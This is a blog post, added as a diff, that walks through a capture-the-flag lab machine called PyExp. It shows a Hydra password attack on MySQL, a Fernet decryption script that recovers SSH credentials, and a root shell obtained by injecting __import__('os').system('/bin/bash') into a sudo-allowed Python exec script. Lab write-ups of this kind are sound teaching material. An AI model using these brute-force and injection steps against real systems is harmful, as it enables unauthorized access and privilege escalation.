@@ -1,0 +1,172 @@
+---
+layout: post
+title:  "Exhost Writeup"
+date:   2022-07-16 08:11:30 +0530
+---
+
+# Walkthrough of Exhost
+
+Hello everyone, in this post I'm sharing `offsec` play grounds `warm-up` machine called `PyExp`. Which teachs about  wordlist attacks, hash cracking and privilege escalation with some  
+
+## Nmap
+
+First thing first that we have to find out opened ports of this target. So, I ran a full port scan against target ip here.
+
+`nmap -sC -sV -p- <target-ip>`
+
+
+here `-p-` indicates that i'm running a full port scan against this. Also `-sV` for service versions and `-sC` for default script. you can find more information using this command `man nmap`. After few minitues I got my result.
+
+```
+Nmap scan report for 192.168.97.118
+Host is up (0.24s latency).
+
+PORT     STATE SERVICE VERSION
+1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 f7:af:6c:d1:26:94:dc:e5:1a:22:1a:64:4e:1c:34:a9 (RSA)
+|   256 46:d2:8d:bd:2f:9e:af:ce:e2:45:5c:a6:12:c0:d9:19 (ECDSA)
+|_  256 8d:11:ed:ff:7d:c5:a7:24:99:22:7f:ce:29:88:b2:4a (ED25519)
+3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1
+|   Thread ID: 41
+|   Capabilities flags: 63486
+|   Some Capabilities: DontAllowDatabaseTableColumn, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, Speaks41ProtocolOld, SupportsTransactions, FoundRows, ODBCClient, ConnectWithDatabase, Speaks41ProtocolNew, SupportsCompression, InteractiveClient, Support41Auth, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: Rp\[43B3vy})Q>!+Q7^U
+|_  Auth Plugin Name: mysql_native_password
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds
+```
+
+Scan shows that it has only few ports open `ssh` and `mysql`.
+
+## Attack
+
+Now we can do a wordlist attack to extract `root` credentials of mysql service.So, we can use different toolslike `hydra`, `medusa`. Here I'm going to use Hydra to attack the mysql service.
+
+
+I used `rockyou.txt` to attck. If you haven't the password list `rockyou.txt`. Here is the link to [download](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).
+
+After the download you can simply run this command.
+
+`hydra -l root -P /path/to/wordlist/rockyou.txt <target-ip> mysql`
+
+Here `-l` for username, `-P` for mention the wordlist you are going to use.
+
+```
+[DATA] attacking mysql://192.168.219.118:3306/
+[3306][mysql] host: 192.168.219.118   login: root   password: prettywoman
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-16 10:34:00
+```
+
+After the attack we can ge the credentials `root:prettywoman`. Using these credentials we can connect to mysql host and can do some further enumeration...
+
+Using this command we can connect.
+
+`mysql -u root -h <target-ip> -p`
+
+Give the password `prettywoman` correctly and login to the mysql. 
+
+```
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 7860
+Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+```
+
+yeaaaaaaaahhhhhhh! We logged in. Now we can see that there are few databases
+
+paste following commands on mysql session.
+
+```
+show dtabases;
+use data;
+show tables;
+select * from fernet;
+```
+`cred:gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=`
+
+`key:UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=`
+
+
+
+after the last command we can get a fernet encrypted string and the key. So, to decrypt it I wrote very simple `python script`.
+
+```
+#!/usr/bin/python3
+from cryptography.fernet import Fernet
+key = b"UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0="
+
+f = Fernet(key)
+cred = b"gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys="
+  
+# decrypting the ciphertext
+m = f.decrypt(cred)
+print(m)
+```
+
+We got username and password from the decryption.
+
+```
+Username:lucy
+Password:wJ9`"Lemdv9[FEw-
+```
+
+Now we can ssh into the target.
+
+`ssh lucy@<target-ip> -p 1337 `
+
+Here mention the port 1337 because in this host ssh port is 1337.
+
+## Privilege escalation
+
+```
+lucy@pyexp:~$ sudo -l
+Matching Defaults entries for lucy on pyexp:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lucy may run the following commands on pyexp:
+    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
+```
+
+`sudo -l` gives us a valuable info here that we can execute a script with root permissions. So, let's see what the script is.
+
+
+```
+uinput = raw_input('how are you?')
+exec(uinput)
+```
+It is executing what I'm write there. So, that is vulnerable to run commands with root privileges.
+
+For an example
+```
+lucy@pyexp:~$ id
+uid=1000(lucy) gid=1000(lucy) groups=1000(lucy),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py 
+how are you?__import__('os').system('id');
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Time to be root
+
+```
+lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py 
+how are you?__import__('os').system('/bin/bash');
+root@pyexp:/home/lucy# 
+root@pyexp:/home/lucy# 
+root@pyexp:/home/lucy# id
+```
+
+Enjoy the flags Yourself!
